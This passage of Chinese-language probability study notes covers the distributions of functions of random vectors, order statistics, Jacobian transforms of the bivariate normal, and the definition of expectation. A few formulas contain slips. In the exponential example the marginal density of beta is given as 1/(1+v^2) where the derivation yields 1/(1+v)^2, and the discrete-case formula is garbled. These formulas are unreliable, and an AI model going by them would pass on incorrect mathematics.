<div class="tabbed-set tabbed-alternate" data-tabs="2:2"><input checked="checked" id="note-probability-second-_18-离散型随机变量" name="note-probability-second-__tabbed_2" type="radio" /><input id="note-probability-second-_18-连续型随机变量" name="note-probability-second-__tabbed_2" type="radio" /><div class="tabbed-labels"><label for="note-probability-second-_18-离散型随机变量">离散型随机变量</label><label for="note-probability-second-_18-连续型随机变量">连续型随机变量</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<p>此时<span class="arithmatex">\(Y\)</span>也是离散型随机变量;根据 <span class="arithmatex">\(X\)</span> 的取值，可以得到 <span class="arithmatex">\(Y\)</span> 的取值，然后根据 <span class="arithmatex">\(X\)</span> 的分布列，可以得到 <span class="arithmatex">\(Y\)</span> 的分布列,</p>
<div class="arithmatex">\[P(Y=y_i)=P(X=x_i,j\dots,k),f(X=x_i,j\dots,k)=y_i\]</div>
</div>
<div class="tabbed-block">
<p>此时<span class="arithmatex">\(Y\)</span>不一定是连续型随机变量，没有统一的计算公式，但是 <strong>一般可以先求出<span class="arithmatex">\(Y\)</span>的分布函数，然后求导得到密度函数</strong></p>
</div>
</div>
</div>
</div>
<h3 id="note-probability-second-_19">随机向量的映射<a class="headerlink" href="#note-probability-second-_19" title="Permanent link">&para;</a></h3>
<p>(连续型)随机向量的映射有时候不仅仅是对于一个结果函数的映射，也有对于一个向量的映射，我们依次考虑</p>
<div class="admonition section">
<p class="admonition-title">求像的分布</p>
<div class="tabbed-set tabbed-alternate" data-tabs="3:1"><input checked="checked" id="note-probability-second-_19-映射到单元" name="note-probability-second-__tabbed_3" type="radio" /><div class="tabbed-labels"><label for="note-probability-second-_19-映射到单元">映射到单元</label></div>
<div class="tabbed-content">
<div class="tabbed-block"></div>
</div>
</div>
<p>假设 <span class="arithmatex">\((\xi_1,\xi_2,\ldots,\xi_i)\)</span>是连续型随机向量，具有联合密度函数<span class="arithmatex">\(p(x_1,x_2,\ldots,x_i)\)</span>，变换如下：</p>
<div class="arithmatex">\[
   \eta = f(\xi_1,\xi_2,\ldots,\xi_i)
\]</div>
<p>那么<span class="arithmatex">\(\eta\)</span>的分布函数可以由以下公式得到</p>
<div class="arithmatex">\[\begin{align*}
   F_{\eta}(y) = P(\eta \leq y) &amp;= P(f(\xi_1,\xi_2,\ldots,\xi_i) \leq y)\\
               &amp;= \int \cdots \int_{f(\xi_1,\xi_2,\ldots,\xi_i) \leq y} p(x_1,x_2,\ldots,x_i)dx_1dx_2\ldots dx_i
\end{align*}\]</div>
<div class="admonition example">
<p class="admonition-title">值得注意的例子</p>
<div class="tabbed-set tabbed-alternate" data-tabs="4:4"><input checked="checked" id="note-probability-second-_19-etaxi_1xi_2" name="note-probability-second-__tabbed_4" type="radio" /><input id="note-probability-second-_19-etaxi_1xi_3" name="note-probability-second-__tabbed_4" type="radio" /><input id="note-probability-second-_19-etadfracxi_1xi_2" name="note-probability-second-__tabbed_4" type="radio" /><input id="note-probability-second-_19-次序统计量的分布" name="note-probability-second-__tabbed_4" type="radio" /><div class="tabbed-labels"><label for="note-probability-second-_19-etaxi_1xi_2"><span class="arithmatex">\(\eta=\xi_1+\xi_2\)</span></label><label for="note-probability-second-_19-etaxi_1xi_3"><span class="arithmatex">\(\eta=\xi_1\xi_2\)</span></label><label for="note-probability-second-_19-etadfracxi_1xi_2"><span class="arithmatex">\(\eta=\dfrac{\xi_1}{\xi_2}\)</span></label><label for="note-probability-second-_19-次序统计量的分布">次序统计量的分布</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<p>如果<span class="arithmatex">\(\xi_1,\xi_2\)</span>是连续型随机变量，那么<span class="arithmatex">\(\eta=\xi_1+\xi_2\)</span>的分布函数为</p>
<div class="arithmatex">\[
F_{\eta}(y) = \int_{-\infty}^{\infty} dx_1\int_{-\infty}^{y-x_1} p(x_1,x_2)dx_2
\]</div>
<p><span class="arithmatex">\(x_2=z-x_1\)</span>，则</p>
<div class="arithmatex">\[
F_{\eta}(y) = \int_{-\infty}^{\infty} dx_1\int_{-\infty}^{y} p(x_1,z-x_1)dz
\]</div>
<p>再交换次序(此时积分区域为矩形，所以我们才可以可以交换次序)</p>
<div class="arithmatex">\[
F_{\eta}(y) = \int_{-\infty}^{y} dz\int_{-\infty}^{\infty} p(x_1,z-x_1)dx_1
\]</div>
<p>所以我们得到密度函数</p>
<div class="arithmatex">\[
p_{\eta}(y) = \int_{-\infty}^{\infty} p(x_1,y-x_1)dx_1
\]</div>
<p>若<span class="arithmatex">\(\xi_1,\xi_2\)</span>相互独立，那么</p>
<div class="arithmatex">\[
p_{\eta}(y) = \int_{-\infty}^{\infty} p_{\xi_1}(x_1)p_{\xi_2}(y-x_1)dx_1
\]</div>
<p>积分区域画图看</p>
</div>
<div class="tabbed-block">
<div class="arithmatex">\[
F_Z(z) = \int_{(x, y) : xy \leq z} p(x, y) \, dx \, dy
\]</div>
<div class="arithmatex">\[
= \int_{-\infty}^0 \int_{z/x}^{\infty} p(x, y) \, dy \, dx + \int_0^{\infty} \int_{-\infty}^{z/x} p(x, y) \, dy \, dx
\]</div>
<div class="arithmatex">\[
= -\int_{\infty}^z \int_{-\infty}^0 \frac{1}{x} p\left(x, \frac{u}{x}\right) \, dx \, du + \int_0^{\infty} \int_0^z \frac{1}{x} p\left(x, \frac{u}{x}\right) \, dx \, du
\]</div>
<div class="arithmatex">\[
p_Z(z) = -\int_{-\infty}^0 \frac{1}{x} p\left(x, \frac{z}{x}\right) \, dx + \int_0^{\infty} \frac{1}{x} p\left(x, \frac{z}{x}\right) \, dx
\]</div>
<div class="arithmatex">\[
= \int_{-\infty}^{\infty} \frac{1}{|x|} p\left(x, \frac{z}{x}\right) \, dx
\]</div>
<p>推导过程中不管<span class="arithmatex">\(z\)</span>是正还是负，积分区域总能这样划分</p>
</div>
<div class="tabbed-block">
<div class="arithmatex">\[
F_{\eta}(y) = P \left( \frac{\xi_1}{\xi_2} \leq y \right) = \iint_{x_1 / x_2 \leq y} p(x_1, x_2) \, dx_1 \, dx_2
\]</div>
<div class="arithmatex">\[
= \int_{-\infty}^0 \int_{y x_2}^{\infty} p(x_1, x_2) \, dx_1 \, dx_2 + \int_0^{\infty} \int_{-\infty}^{y x_2} p(x_1, x_2) \, dx_1 \, dx_2
\]</div>
<p>令 <span class="arithmatex">\( x_1 = z x_2 \)</span>，并交换积分次序，得</p>
<div class="arithmatex">\[
F_{\eta}(y) = \int_{-\infty}^y \int_{-\infty}^{\infty} p(z x_2, x_2) x_2 \, dx_2 \, dz = \int_{-\infty}^y p_{\eta}(z) \, dz
\]</div>
<p>这说明若 <span class="arithmatex">\( (\xi_1, \xi_2) \)</span> 是连续型随机向量，则 <span class="arithmatex">\( \eta = \frac{\xi_1}{\xi_2} \)</span> 是连续型随机变量，其密度函数为</p>
<div class="arithmatex">\[
p_{\eta}(z) = \int_{-\infty}^{\infty} p(z x, x) |x| \, dx.
\]</div>
<p>推导过程中不管<span class="arithmatex">\(y\)</span>是正还是负，积分区域总能这样划分</p>
</div>
<div class="tabbed-block">
<p>设 <span class="arithmatex">\( \xi_1, \xi_2, \dots, \xi_n \)</span> 独立同分布，分布函数都为 <span class="arithmatex">\( F(x) \)</span>。把 <span class="arithmatex">\( \xi_1, \xi_2, \dots, \xi_n \)</span> 每取一组值 <span class="arithmatex">\( \xi_1(\omega), \xi_2(\omega), \dots, \xi_n(\omega) (\omega \in \Omega) \)</span> 都按大小次序排列，所得随机变量 <span class="arithmatex">\( \xi_{(1)}, \xi_{(2)}, \dots, \xi_{(n)} \)</span> 称为 <strong>次序统计量</strong>  (order statistics)，它们满足 <span class="arithmatex">\( \xi_{(1)} \leq \xi_{(2)} \leq \dots \leq \xi_{(n)} \)</span>。按定义，<span class="arithmatex">\( \xi_{(1)} = \min(\xi_1, \xi_2, \dots, \xi_n) \)</span>，<span class="arithmatex">\( \xi_{(n)} = \max(\xi_1, \xi_2, \dots, \xi_n) \)</span>。</p>
<p>现在来求 <span class="arithmatex">\( \xi_{(1)}, \xi_{(n)} \)</span> 及 <span class="arithmatex">\( (\xi_{(1)}, \xi_{(n)}) \)</span> 的分布，这在数理统计中是有用的。</p>
<details class="property">
<summary>极值随机变量</summary>
<p><span class="arithmatex">\(\xi_{(1)}\)</span>是最小值，<span class="arithmatex">\(\xi_{(n)}\)</span>是最大值,<span class="arithmatex">\(\xi_{(k)}\)</span>是第k小值</p>
</details>
<ol>
<li>
<p><strong><span class="arithmatex">\( \xi_{(n)} \)</span> 的分布函数</strong></p>
<div class="arithmatex">\[
  P(\xi_{(n)} \leq x) = P(\xi_1 \leq x, \xi_2 \leq x, \dots, \xi_n \leq x)
\]</div>
<div class="arithmatex">\[
  = P(\xi_1 \leq x) P(\xi_2 \leq x) \cdots P(\xi_n \leq x)
\]</div>
<div class="arithmatex">\[
  = [F(x)]^n.
\]</div>
</li>
<li>
<p><strong><span class="arithmatex">\( \xi_{(1)} \)</span> 的分布函数</strong></p>
<p>先考虑 <span class="arithmatex">\( \{\xi_{(1)} \leq x\} \)</span> 的逆事件 <span class="arithmatex">\( \{\xi_{(1)} &gt; x\} \)</span>，</p>
<div class="arithmatex">\[
  P(\xi_{(1)} &gt; x) = P(\xi_1 &gt; x, \xi_2 &gt; x, \dots, \xi_n &gt; x)
\]</div>
<div class="arithmatex">\[
  = P(\xi_1 &gt; x) P(\xi_2 &gt; x) \cdots P(\xi_n &gt; x)
\]</div>
<div class="arithmatex">\[
  = [1 - F(x)]^n.
\]</div>
<p>故</p>
<div class="arithmatex">\[
  P(\xi_{(1)} \leq x) = 1 - [1 - F(x)]^n.
\]</div>
</li>
<li>
<p><strong><span class="arithmatex">\( (\xi_{(1)}, \xi_{(n)}) \)</span> 的联合分布函数</strong></p>
<div class="arithmatex">\[
  F(x, y) = P(\xi_{(1)} \leq x, \xi_{(n)} \leq y)
\]</div>
<div class="arithmatex">\[
  = P(\xi_{(n)} \leq y) - P(\xi_{(1)} &gt; x, \xi_{(n)} \leq y)
\]</div>
<div class="arithmatex">\[
  = [F(y)]^n - P \left( \bigcap_{i=1}^n (x &lt; \xi_i \leq y) \right).
\]</div>
<p>因此当 <span class="arithmatex">\( x &lt; y \)</span> 时，</p>
<div class="arithmatex">\[
  F(x, y) = [F(y)]^n - [F(y) - F(x)]^n.
\]</div>
<p>当 <span class="arithmatex">\( x \geq y \)</span> 时，</p>
<div class="arithmatex">\[
  F(x, y) = [F(y)]^n.
\]</div>
<p>如果 <span class="arithmatex">\( \xi_1, \dots, \xi_n \)</span> 是连续型随机变量，有密度 <span class="arithmatex">\( p(x) = F'(x) \)</span>，则上面各随机变量（向量）也是连续型的，可将各分布函数求导以得到密度函数。</p>
</li>
</ol>
<p>4.第k小值的密度函数</p>
<div class="arithmatex">\[
    p_{\xi_{(k)}}(x) = \frac{n!}{(k-1)!(n-k)!} [F(x)]^{k-1} [1-F(x)]^{n-k} f(x)
\]</div>
<p>其中<span class="arithmatex">\(f(x)\)</span>是密度函数</p>
<p>在前面有<span class="arithmatex">\(k-1\)</span>个小于<span class="arithmatex">\(x\)</span>的值,再挑一个在<span class="arithmatex">\(x\)</span>领域的值，有<span class="arithmatex">\(n-k\)</span>个大于<span class="arithmatex">\(x\)</span>的值，让领域缩小，除以该领域就得到密度函数</p>
<div class="arithmatex">\[
    \lim_{\varepsilon \to 0} \frac{P(x \leqslant \xi_{(k)} \leqslant x + \varepsilon)}{\varepsilon} = p_{\xi_{(k)}}(x)
\]</div>
<p>如果是多个就多个小领域，然后除以小领域的长度</p>
</div>
</div>
</div>
</div>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>这种从负无穷积分到正无穷的写法只是形式上的，实际上我们要根据具体密度函数的取值来进一步判断积分区域</p>
</div>
</div>
<h4 id="note-probability-second-_20">多个值函数<a class="headerlink" href="#note-probability-second-_20" title="Permanent link">&para;</a></h4>
<p>我们仅考虑连续型随机向量的变换。</p>
<p>假设 <span class="arithmatex">\((X, Y)\)</span> 为连续型随机向量，具有联合密度函数 <span class="arithmatex">\(p(X, Y)(x, y)\)</span>。变换如下：</p>
<div class="arithmatex">\[
\begin{cases}
U = f_1(X, Y) \\
V = f_2(X, Y)
\end{cases}
\]</div>
<p>求 <span class="arithmatex">\((U, V)\)</span> 的分布？</p>
<ul>
<li>基本方法</li>
</ul>
<div class="arithmatex">\[
\begin{align*}
P(U \leqslant u, V \leqslant v) &amp;= P(f_1(X, Y) \leqslant u, f_2(X, Y) \leqslant v) \\
&amp;= P((X, Y) \in \{(x, y) : f_1(x, y) \leqslant u, f_2(x, y) \leqslant v\}) \\
&amp;= \int_{(x,y): f_1(x,y) \leqslant u, f_2(x,y) \leqslant v} p(x, y) \, dx \, dy
\end{align*}
\]</div>
<p>如果<span class="arithmatex">\(f_1\)</span>和<span class="arithmatex">\(f_2\)</span>可逆，那么</p>
<div class="arithmatex">\[
\begin{cases}
X = f_1^{-1}(U, V) \\
Y = f_2^{-1}(U, V)
\end{cases}
\]</div>
<p>取Jacobian行列式</p>
<div class="arithmatex">\[
J = \left| \begin{array}{cc} \frac{\partial f_1^{-1}(u, v)}{\partial u} &amp; \frac{\partial f_1^{-1}(u, v)}{\partial v} \\ \frac{\partial f_2^{-1}(u, v)}{\partial u} &amp; \frac{\partial f_2^{-1}(u, v)}{\partial v} \end{array} \right|
\]</div>
<p>那么</p>
<div class="arithmatex">\[
    P(U \leqslant u', V \leqslant v') = \int_{(u,v): u \leqslant u', v \leqslant v'} p(f_1^{-1}(u,v), f_2^{-1}(u,v)) |J| \, du \, dv
\]</div>
<p>即</p>
<div class="arithmatex">\[
    p(u, v) = p(f_1^{-1}(u,v), f_2^{-1}(u,v)) |J|
\]</div>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p><span class="arithmatex">\(x,y\)</span>分别用<span class="arithmatex">\(u,v\)</span>表示，再乘以雅克比行列式,可以推广到<span class="arithmatex">\(n\)</span>维随机向量的情况：</p>
<p>设 <span class="arithmatex">\((\xi_1, \ldots, \xi_n)\)</span> 的密度函数为 <span class="arithmatex">\(p(x_1, \ldots, x_n)\)</span>. 现在有 <span class="arithmatex">\(m\)</span> 个函数: <span class="arithmatex">\(\eta_1 = f_1(\xi_1, \ldots, \xi_n), \ldots, \eta_m = f_m(\xi_1, \ldots, \xi_n)\)</span>, 则 <span class="arithmatex">\((\eta_1, \ldots, \eta_m)\)</span> 也是随机变量. 除了各边际分布外，还要求其联合分布. 例如 (2.67) 式，其联合分布函数为</p>
<div class="arithmatex">\[
G(y_1, \ldots, y_m) = P(\eta_1 \leq y_1, \ldots, \eta_m \leq y_m) = \int \cdots \int p(x_1, \ldots, x_n) dx_1 \cdots dx_n, \tag{2.72}
\]</div>
<p>这里 <span class="arithmatex">\(D\)</span> 是 <span class="arithmatex">\(n\)</span> 维区域: <span class="arithmatex">\(\{(x_1, \ldots, x_n): f_1(x_1, \ldots, x_n) \leq y_1, \ldots, f_m(x_1, \ldots, x_n) \leq y_m\}\)</span>.</p>
<p>如果 <span class="arithmatex">\(m = n, f_j, j = 1, \ldots, n\)</span> 有唯一的反函数组: <span class="arithmatex">\(x_i = x_i(y_1, \ldots, y_n), i = 1, \ldots, n\)</span>, 且</p>
<div class="arithmatex">\[
J = \frac{\partial(x_1, \ldots, x_n)}{\partial(y_1, \ldots, y_n)} \neq 0,
\]</div>
<p>则 <span class="arithmatex">\((\eta_1, \ldots, \eta_n)\)</span> 是连续型随机变量. 当 <span class="arithmatex">\((y_1, \ldots, y_n) \in (f_1, \ldots, f_n)\)</span> 的值域时，其密度为</p>
<div class="arithmatex">\[
q(y_1, \ldots, y_n) = p(x_1(y_1, \ldots, y_n), \ldots, x_n(y_1, \ldots, y_n)) |J|, \tag{2.73}
\]</div>
<p>其他情况, <span class="arithmatex">\(q(y_1, \ldots, y_n) = 0\)</span>.</p>
</div>
<div class="admonition example">
<p class="admonition-title">Example</p>
<div class="admonition property">
<p class="admonition-title">Property</p>
<p>实际上，对于联合正态分布，我们可以设</p>
<div class="arithmatex">\[
    \boldsymbol{X} =(x,y), \boldsymbol{\mu} =(\mu_1,\mu_2)
\]</div>
<div class="arithmatex">\[
\Sigma = \begin{pmatrix} \sigma_1^2 &amp; \rho\sigma_1\sigma_2 \\ \rho\sigma_1\sigma_2 &amp; \sigma_2^2 \end{pmatrix}
\]</div>
<div class="arithmatex">\[
    \Sigma^{-1} =A \begin{pmatrix} \dfrac{1}{\sigma_1^2} &amp; -\dfrac{\rho}{\sigma_1\sigma_2} \\ -\dfrac{\rho}{\sigma_1\sigma_2} &amp; \dfrac{1}{\sigma_2^2} \end{pmatrix}
\]</div>
<p>其中A为<span class="arithmatex">\(\dfrac{1}{1-\rho^2}\)</span>的一个数乘矩阵</p>
<p>那么联合正态分布的密度函数为</p>
<div class="arithmatex">\[
p(X, Y)(x, y) = \frac{1}{2\pi |\Sigma|^{\frac{1}{2}}} e^{-\frac{1}{2} (\mathbf{x} - \boldsymbol{\mu})^{\mathrm{T}} \Sigma^{-1} (\mathbf{x} - \boldsymbol{\mu})}
\]</div>
</div>
<p>设 </p>
<div class="arithmatex">\[
\begin{pmatrix}
U \\
V
\end{pmatrix}
=
\begin{pmatrix}
a &amp; b \\
c &amp; d
\end{pmatrix}
\cdot
\begin{pmatrix}
X \\
Y
\end{pmatrix}
= A \cdot \begin{pmatrix}
X \\
Y
\end{pmatrix}
\]</div>
<p>设</p>
<div class="arithmatex">\[
    \mathbf{x} = \begin{pmatrix}
    x \\
    y
    \end{pmatrix}
\]</div>
<div class="arithmatex">\[
    \mathbf{u} = \begin{pmatrix}
    u \\
    v
    \end{pmatrix}
\]</div>
<p>那么</p>
<div class="arithmatex">\[
    \mathbf{u} = A \mathbf{x}
\]</div>
<p>取逆变换</p>
<div class="arithmatex">\[
    \mathbf{x} = A^{-1} \mathbf{u}
\]</div>
<div class="arithmatex">\[\begin{align*}
p(U,V)(u,v) &amp;= p(X,Y)(A^{-1} \mathbf{u}) |J|\\
            &amp;=  \frac{1}{2\pi |\Sigma|^{\frac{1}{2}}} e^{-\frac{1}{2} (A^{-1} \mathbf{u} - \boldsymbol{\mu})^{\mathrm{T}} \Sigma^{-1} (A^{-1} \mathbf{u} - \boldsymbol{\mu})} |A^{-1}|\\
            &amp;= \frac{1}{2\pi |A \Sigma A^{\mathrm{T}}|^{\frac{1}{2}}} e^{-\frac{1}{2} ( \mathbf{u} - A\boldsymbol{\mu})^{\mathrm{T}} (A \Sigma A^{\mathrm{T}})^{-1} (\mathbf{u} - A\boldsymbol{\mu})}\\
\end{align*}\]</div>
<p>故</p>
<div class="arithmatex">\[
    (U,V) \sim \mathcal{N}(A\boldsymbol{\mu}, A \Sigma A^{\mathrm{T}})
\]</div>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>即<span class="arithmatex">\((U,V)\)</span>的协方差矩阵为<span class="arithmatex">\(A \Sigma A^{\mathrm{T}}\)</span>, 均值为<span class="arithmatex">\(A\boldsymbol{\mu}\)</span>;
总结而言，对于<span class="arithmatex">\((X,Y)\)</span>的联合正态分布做线性变换，新的随机向量仍然是联合正态分布，且均值也做了相应的线性变换，协方差矩阵做了相应的 <strong>变换</strong> ，但是转置在后面。</p>
</div>
<p>如果做极坐标变换</p>
<div class="arithmatex">\[
    \begin{cases}
    x = \rho \cos \theta \\
    y = \rho \sin \theta
    \end{cases}
\]</div>
<p><strong>联合密度函数</strong>：</p>
<div class="arithmatex">\[
   p(\rho, \theta) = \frac{1}{2\pi} e^{-\frac{1}{2}((\rho \cos \theta)^2 + (\rho \sin \theta)^2)} \rho
\]</div>
<p>可以简化为：</p>
<div class="arithmatex">\[
   p(\rho, \theta) = \frac{1}{2\pi} \rho e^{-\frac{\rho^2}{2}}
\]</div>
<p><strong>边际分布</strong>：</p>
<ul>
<li>
<p>对于 <span class="arithmatex">\(\rho\)</span>：</p>
<div class="arithmatex">\[
   \rho \sim p_\rho(\rho) = \rho e^{-\frac{\rho^2}{2}}, \quad \rho &gt; 0
\]</div>
</li>
<li>
<p>对于 <span class="arithmatex">\(\theta\)</span>：</p>
<div class="arithmatex">\[
    \theta \sim p_\theta(\theta) = \frac{1}{2\pi}, \quad 0 &lt; \theta &lt; 2\pi
\]</div>
</li>
</ul>
<p><strong>独立性</strong>：
   <span class="arithmatex">\(\rho\)</span> 和 <span class="arithmatex">\(\theta\)</span> 是独立的随机变量。</p>
<p>称 <span class="arithmatex">\(\rho\)</span> 为 Rayleigh 分布，<span class="arithmatex">\(\theta\)</span> 为均匀分布。    </p>
</div>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>$\xi, \eta $相互独立，都服从参数为 1 的指数分布，求 <span class="arithmatex">\(\alpha = \xi + \eta\)</span> 与 <span class="arithmatex">\(\beta = \dfrac{\xi}{\eta}\)</span> 的联合密度；并分别求出 <span class="arithmatex">\(\alpha\)</span>与 <span class="arithmatex">\(\beta\)</span> 的密度。</p>
<p><span class="arithmatex">\((\xi, \eta)\)</span> 的联合密度为：当 <span class="arithmatex">\(x &gt; 0\)</span> 且 <span class="arithmatex">\(y &gt; 0\)</span> 时，</p>
<div class="arithmatex">\[
p(x, y) = e^{-(x+y)}, \quad x &gt; 0, y &gt; 0.
\]</div>
<p>其他情况为 0。</p>
<p>函数组为：</p>
<div class="arithmatex">\[
\begin{cases}
u = x + y \\
v = x / y
\end{cases}
\]</div>
<p>计算雅可比行列式：</p>
<div class="arithmatex">\[
J^{-1} = \frac{\partial(u, v)}{\partial(x, y)} = \begin{vmatrix}
1 &amp; 1 \\
\frac{1}{y} &amp; -\frac{x}{y^2}
\end{vmatrix} = 1 \cdot \left(-\frac{x}{y^2}\right) - 1 \cdot \frac{1}{y} = -\frac{(1+v)^2}{u}.
\]</div>
<p>故</p>
<div class="arithmatex">\[
|J| = \dfrac{u}{(1 + v)^2}.
\]</div>
<p><span class="arithmatex">\((\alpha, \beta)\)</span> 的联合密度为：</p>
<div class="arithmatex">\[
q(u, v) = \begin{cases}
\dfrac{ue^{-u}}{(1 + v)^2}, &amp; u &gt; 0, v &gt; 0, \\
0, &amp; \text{其他}.
\end{cases}
\]</div>
<p><span class="arithmatex">\(\alpha = \xi + \eta\)</span> 与 <span class="arithmatex">\(\beta = \dfrac{\xi}{\eta}\)</span> 各自的密度为 <span class="arithmatex">\(q(u, v)\)</span> 的边际密度。不难看出：</p>
<div class="arithmatex">\[
p_{\alpha}(u) = \begin{cases}
ue^{-u}, &amp; u &gt; 0, \\
0, &amp; u \leqslant 0.
\end{cases}
\]</div>
<p>和</p>
<div class="arithmatex">\[
p_{\beta}(v) = \begin{cases}
\dfrac{1}{1 + v^2}, &amp; v &gt; 0, \\
0, &amp; v \leqslant 0.
\end{cases}
\]</div>
<p>并且 <span class="arithmatex">\(\alpha,\beta\)</span> 相互独立。</p>
<p>本例中，自然也可以用单元的方法计算 <span class="arithmatex">\(\xi + \eta\)</span> 各自的分布，但这里的方法显然更便捷,更方便。</p>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>这是一个富有有趣性的例子，它告诉我们：</p>
<ul>
<li>
<p>要判断随机变量的几个函数是否独立，可用随机变量变换求得它们的联合分布，再用独立性的各种必要条件来判断；</p>
</li>
<li>
<p>要求随机变量的一个函数的分布，有时可作适当补充，先求它们的联合分布，而后要求的函数的分布则作为求其边际分布。</p>
</li>
</ul>
<p>所以对于我们前面讨论的单元函数，也可以将其补全为多元，再计算边际分布，例如对于<span class="arithmatex">\(\alpha = \xi + \eta\)</span>，我们可以将其补全为<span class="arithmatex">\((\alpha,\beta) = (\xi + \eta, \eta)\)</span>，再计算<span class="arithmatex">\((\alpha,\beta)\)</span>的联合分布，最后求出<span class="arithmatex">\(\alpha\)</span>的边际分布，这与我们前面的结果是一样的</p>
</div>
</div></section><section class="print-page" id="note-probability-third" heading-number="2.3.2.4"><h1 id="note-probability-third-_1">数字特征<a class="headerlink" href="#note-probability-third-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 3969 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 14 分钟</p>
</div>
<h2 id="note-probability-third-_2">数学期望<a class="headerlink" href="#note-probability-third-_2" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">数学期望的定义</p>
<p>设<span class="arithmatex">\(X\)</span>是一个离散型随机变量，<span class="arithmatex">\(X\)</span>的数学期望（或称为期望值）是<span class="arithmatex">\(X\)</span>所有可能取值的加权平均，记为<span class="arithmatex">\(E(X)\)</span>或<span class="arithmatex">\(\mu\)</span>，即</p>
<div class="arithmatex">\[
    E(X)=\sum_{i=1}^{n}x_iP(X=x_i)
\]</div>
<p>其中，<span class="arithmatex">\(x_i\)</span>是<span class="arithmatex">\(X\)</span>的可能取值，<span class="arithmatex">\(P(X=x_i)\)</span>是<span class="arithmatex">\(X\)</span>取值为<span class="arithmatex">\(x_i\)</span>的概率。</p>
<p>若<span class="arithmatex">\(X\)</span>是一个连续型随机变量，其概率密度函数为<span class="arithmatex">\(p(x)\)</span>，则<span class="arithmatex">\(X\)</span>的数学期望为</p>
<div class="arithmatex">\[
    E(X)=\int_{-\infty}^{+\infty}xp(x)dx
\]</div>
</div>
<p>数学期望的意义在于，当随机变量<span class="arithmatex">\(X\)</span>独立重复地进行大量实验时，<span class="arithmatex">\(X\)</span>的平均值将趋于<span class="arithmatex">\(E(X)\)</span>。</p>
<p>数学期望跟参数有关，有几个参数就跟几个参数有关。</p>
<div class="admonition property">
<p class="admonition-title">常见分布的数学期望</p>
<div class="tabbed-set tabbed-alternate" data-tabs="1:7"><input checked="checked" id="note-probability-third-_2-二项分布" name="note-probability-third-__tabbed_1" type="radio" /><input id="note-probability-third-_2-泊松分布" name="note-probability-third-__tabbed_1" type="radio" /><input id="note-probability-third-_2-几何分布" name="note-probability-third-__tabbed_1" type="radio" /><input id="note-probability-third-_2-均匀分布" name="note-probability-third-__tabbed_1" type="radio" /><input id="note-probability-third-_2-指数分布" name="note-probability-third-__tabbed_1" type="radio" /><input id="note-probability-third-_2-正态分布" name="note-probability-third-__tabbed_1" type="radio" /><input id="note-probability-third-_2-超几何分布" name="note-probability-third-__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="note-probability-third-_2-二项分布">二项分布</label><label for="note-probability-third-_2-泊松分布">泊松分布</label><label for="note-probability-third-_2-几何分布">几何分布</label><label for="note-probability-third-_2-均匀分布">均匀分布</label><label for="note-probability-third-_2-指数分布">指数分布</label><label for="note-probability-third-_2-正态分布">正态分布</label><label for="note-probability-third-_2-超几何分布">超几何分布</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<p>若<span class="arithmatex">\(X\sim B(n,p)\)</span>，则</p>
<div class="arithmatex">\[E(X)=np\]</div>
</div>
<div class="tabbed-block">
<p>若<span class="arithmatex">\(X\sim P(\lambda)\)</span>，则</p>
<div class="arithmatex">\[E(X)=\lambda\]</div>
</div>
<div class="tabbed-block">
<p>若<span class="arithmatex">\(X\sim G(p)\)</span>，则</p>
<div class="arithmatex">\[E(X)=\dfrac{1}{p}\]</div>
</div>
<div class="tabbed-block">
<p>若<span class="arithmatex">\(X\sim U(a,b)\)</span>，则</p>
<div class="arithmatex">\[E(X)=\dfrac{a+b}{2}\]</div>
</div>
<div class="tabbed-block">
<p>若<span class="arithmatex">\(X\sim E(\lambda)\)</span>，则</p>
<div class="arithmatex">\[E(X)=\dfrac{1}{\lambda}\]</div>
</div>
<div class="tabbed-block">
<p>若<span class="arithmatex">\(X\sim N(\mu,\sigma^2)\)</span>，则</p>
<div class="arithmatex">\[E(X)=\mu\]</div>
</div>
<div class="tabbed-block">
<p>若<span class="arithmatex">\(X\sim H(N,M,n)\)</span>，则</p>
<div class="arithmatex">\[E(X)=n\dfrac{M}{N}\]</div>
</div>
</div>
</div>
</div>
<p>在计算数学期望的时候需要用到级数的知识，需要考虑到函数列是否一致收敛来运用逐项求导或者求积分，级数是否绝对收敛来判断是否可以用级数的重排；</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>为了避免同一个随机变量因为排序不同造成的数学期望不同，我们要求</p>
<div class="arithmatex">\[
    \sum_{i=1}^{\infty}x_ip_i
\]</div>
<p>是绝对收敛的(<span class="arithmatex">\(\sum_{i=1}^{\infty}\lvert x_ip_i \rvert\)</span>收敛)，即该级数的任意一个重排都收敛于同一个值。
如果是连续型随机变量，则要求</p>
<div class="arithmatex">\[
    \int_{-\infty}^{+\infty}\lvert xp(x) \rvert dx
\]</div>
<p>可积。</p>
</div>
<h3 id="note-probability-third-_3">数学期望的性质<a class="headerlink" href="#note-probability-third-_3" title="Permanent link">&para;</a></h3>
<ul>
<li><mark class="critic">有界</mark>: </li>
</ul>
<div class="arithmatex">\[
    a \leqslant X \leqslant b \Rightarrow a \leqslant E(X) \leqslant b
